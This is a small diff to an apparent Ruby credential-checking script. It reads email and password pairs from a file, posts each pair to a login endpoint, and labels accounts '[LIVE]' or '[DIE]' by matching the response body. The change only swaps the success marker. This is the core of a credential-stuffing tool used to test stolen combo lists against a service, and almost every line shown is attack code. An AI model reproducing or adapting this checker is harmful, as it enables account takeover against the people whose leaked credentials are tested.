@@ -14,7 +14,7 @@ File.readlines(file).each do |line|
   senhafix = splitfields[1].gsub("\n" , "")
   res = Net::HTTP.post_form(uri, 'email' => splitfields[0], 'password' => senhafix)
 	
-	if res.body.include? 'true,"userId":'
+	if res.body.include? 'live msg'
    	puts "[LIVE] #{splitfields[0]} #{splitfields[1]}"
    	else
    	puts "[DIE] #{splitfields[0]} #{splitfields[1]}"
